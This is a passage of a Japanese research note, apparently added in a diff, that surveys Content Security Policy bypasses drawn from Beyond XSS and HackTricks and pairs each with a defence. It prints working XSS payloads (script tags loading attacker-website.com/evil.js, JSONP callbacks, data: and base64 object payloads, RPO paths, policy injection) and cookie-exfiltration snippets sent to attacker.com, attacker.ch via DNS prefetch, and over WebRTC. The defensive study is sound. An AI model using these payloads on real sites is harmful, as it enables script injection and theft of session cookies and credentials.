+`http://localhost:5555/301` が `https://www.google.com/complete/search?jsonp=alert(1)` へ301リダイレクトすると、CSPは最終URLのパスを検証しないため、JSONP穴のあるパスへ到達できる。**なぜ動くか**：CSPのリダイレクト時のマッチングは「オリジンは見るがパスは見ない」仕様（情報漏洩防止のため、リダイレクト先パスを攻撃者に観測させない設計の副作用）。**防御**はサイトにオープンリダイレクトを残さないこと。
+
+#### (6) 相対パス上書き（RPO）：`%2f` のデコード差
+
+パス制限を、URLエンコードされたスラッシュのデコード差で回避する。
+
+```html
+<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
+```
+
+**なぜ動くか**：ブラウザは `%2f` を「エンコードされた文字」として扱い、パスは表面上 `scripts/react/` 配下に見えるためCSPを通す。ところがサーバ側が `%2f` を `/` にデコードすると、実際には `scripts/react/../angular/angular.js`＝親ディレクトリの `angular/angular.js` が読み込まれる。**防御**はサーバで `%2f` を `/` として正規化しない（デコードしてからのパス解決をしない）こと。
+
+#### (7) 厳格なCSPでも残る情報の持ち出し
+
+`default-src 'none'` でも、以下の経路でデータは外へ出せる（＝CSPはXSSの実行は止めても、情報漏洩の全経路は塞げない）。
+
+- **ナビゲーション**：`window.location = 'https://example.com?q=' + document.cookie`
+- **WebRTC**：ICEサーバ設定を通じてSTUN/TURN経由でデータを漏らす
+- **DNSプリフェッチ**：`<link rel="dns-prefetch" href="https://<秘密>.example.com">` でサブドメインにデータを載せてDNS問い合わせとして送る
+
+将来的な `navigate-to` / `webrtc` ディレクティブが一部を塞ぐ可能性はあるが、現状はCSP単独では防ぎきれない。Beyond XSS は「完全に問題のないCSPを書くのは難しく、時間をかけて段階的にunsafeな要素を消していく」という漸進的ハードニングを推奨している。
+
+> 出典: Beyond XSS — CSP bypass — https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
+
+---
+
+### 資料3：HackTricks — CSPバイパス総覧（実務チートシート）
+
+HackTricks のCSPバイパス項は、ペンテスト現場で「与えられたポリシー文字列を見て、どの穴から入るか」を素早く判断するためのカタログである。上の2資料と重なる部分は要点のみとし、追加で重要なものを挙げる。
+
+#### インライン許可・ワイルドカード・スキーム
+
+`'unsafe-inline'` があれば古典的にそのまま通る。
+
+```html
+"/><script>alert(1);</script>
+```
+
+ワイルドカードや広いスキーム（`script-src 'self' https://google.com https: data *;`）があれば、任意オリジンや `data:` から読み込める。
+
+```html
+"/>'><script src=https://attacker-website.com/evil.js></script>
+"/>'><script src=data:text/javascript,alert(1337)></script>
+```
+
+#### JSONPエンドポイント一覧（許可ドメイン別）
+
+`'self'` に加えてこれらの著名ドメインが許可されていると、既知のJSONP穴でバイパスできる。JSONBee がこうしたエンドポイントをまとめている。
+
+```
+https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1
+https://accounts.google.com/o/oauth2/revoke?callback=eval(...)
+https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert
+https://www.youtube.com/oembed?callback=alert
+```
+
+`ajax.googleapis.com` が許可されていれば、AngularJSを読み込んでガジェット化する定番も使える。
+
+```html
+<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
+```
+
+#### ファイルアップロード + `'self'`
+
+`script-src 'self'` のサイトに、JSとして解釈されるファイルをアップロードできれば自爆する。
+
+```html
+"/>'><script src="/uploads/picture.png.js"></script>
+```
+
+拡張子偽装（`.png.js`）やポリグロット、サーバのMIME判定次第で成立する。**同一オリジンにアップロード機能があるなら `'self'` は危険**という教訓。
+
+#### ディレクティブ欠落の悪用
+
+`object-src` も `default-src` も無ければ、`<object>` で `data:` HTMLを実行できる。
+
+```html
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+```
+
+`base-uri` 欠落は前述の `<base>` 乗っ取りにつながる。
+
+#### ポリシー・インジェクション
+
+アプリがCSP文字列に攻撃者入力を反映してしまう場合、ポリシー自体を書き換える。
+- **Chrome**：`script-src-elem *` を注入して制限を上書き（後発ディレクティブが優先される挙動を悪用）。
+- **Edge**：`;_` を注入してポリシー全体を壊す（無効化）。
+
+#### 外部通信ゼロでの情報持ち出し
+
+`connect-src` すら無い環境でのデータ漏洩の実物。
+
+```javascript
+// DNSプリフェッチにcookieを載せる
+var sessionid = document.cookie.split("=")[1];
+var body = document.getElementsByTagName("body")[0];
+body.innerHTML += '<link rel="dns-prefetch" href="//' + sessionid + 'attacker.ch">'
+```
+
+```javascript
+// WebRTCのDNS問い合わせで漏らす
+p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] });
+p.createDataChannel("");
+p.setLocalDescription(await p.createOffer())
+```
+
+```javascript
+// 素朴なナビゲーション
+document.location = "https://attacker.com/?" + document.cookie
+```
+
+#### PHP実装依存のバイパス
+
+CSPヘッダを `header()` で送る前に出力が始まってしまうとヘッダが付かない、という実装の隙を突く。
+- **max_input_vars 超過**：大量のPOST変数を送るとwarningが `header()` 前に出力され、「headers already sent」でCSPヘッダの送出に失敗する。
+- **レスポンスバッファ飽和**：4096バイト超のwarning等でバッファを溢れさせ、CSP付与前に本文送信を始めさせる。
+
+#### `form-action` 欠落による資格情報窃取
+
+`form-action` が無いと、反映HTMLに偽ログインフォームを注入できる。ブラウザのパスワードマネージャが自動入力し、既定の `GET` 送信で資格情報がURLに載り、`<meta http-equiv="Refresh">` でクロスオリジンへ飛ばしてReferer経由で漏らす。joaxcarの事例で `form-action` 欠落が別途指摘されたのはこの文脈である。
+
+#### ブックマークレット
+
+CSPは「ページ内で読み込むリソース」を制御するが、ユーザがドラッグ＆ドロップした**ブックマークレット**はページのCSPの外で実行される。ソーシャルエンジニアリングと組み合わせる古典。
+
+#### 分析ツール
+
+- **CSP Evaluator**（Google）: https://csp-evaluator.withgoogle.com/ — ポリシーの弱点を機械診断
+- **CSP Validator**: https://cspvalidator.org/
+- **csper.io** — 観測リソースから候補ポリシーを生成
+
+> 出典: HackTricks — Content Security Policy (CSP) Bypass — https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
+
+---
+
+### 横断まとめ：バイパスを4つの型に分類する
+
+3資料を貫く共通構造を、防御設計に使える形で分類しておく。
+
+1. **許可リストの過剰（設定漏れ型）**：CDNまるごと・`*`・`data:`・`unsafe-inline`/`unsafe-eval`。→ パスまで厳密指定、`'strict-dynamic'` + nonce に移行し、ホスト名ホワイトリストへの依存を捨てる。
+2. **信頼済みドメイン内のガジェット（ホワイトリスト裏切り型）**：JSONP、AngularJS、既存ライブラリのテンプレート評価。→ 許可ドメインをCSP Evaluator / JSONBee で監査。Google系（`www.google.com`, `ajax.googleapis.com`, `accounts.google.com`）は特に危険。
+3. **パーサ・仕様の解釈差（デコード/リダイレクト型）**：`%2f` のRPO、リダイレクトでのパス無視、`<base>` 乗っ取り、ポリシー・インジェクション。→ `base-uri 'none'`、オープンリダイレクト排除、`%2f` を正規化しない、CSP文字列に入力を反映しない。
+4. **実行は防いでも漏洩は防げない（範囲外型）**：`location`、WebRTC、DNSプリフェッチ、`form-action` 欠落による資格情報窃取。→ `connect-src`/`form-action`/`navigate-to` を明示し、CSPを「XSS実行の防止」に限定した防御と割り切って多層で守る。
+
+最重要の実務結論は、`strict-dynamic` を伴うnonceベースCSP（strict CSP、s4i参照）への移行である。ホスト名ホワイトリスト方式は上記1〜3のほぼ全てに晒されるが、strict CSPはホワイトリスト自体を無効化するため、JSONP・AngularJS・RPO・リダイレクトといった「信頼済みドメイン悪用」系のバイパスをまとめて封じられる。joaxcarのportswigger.net事例は、まさに `strict-dynamic` の欠落が全ての引き金だったことを示している。
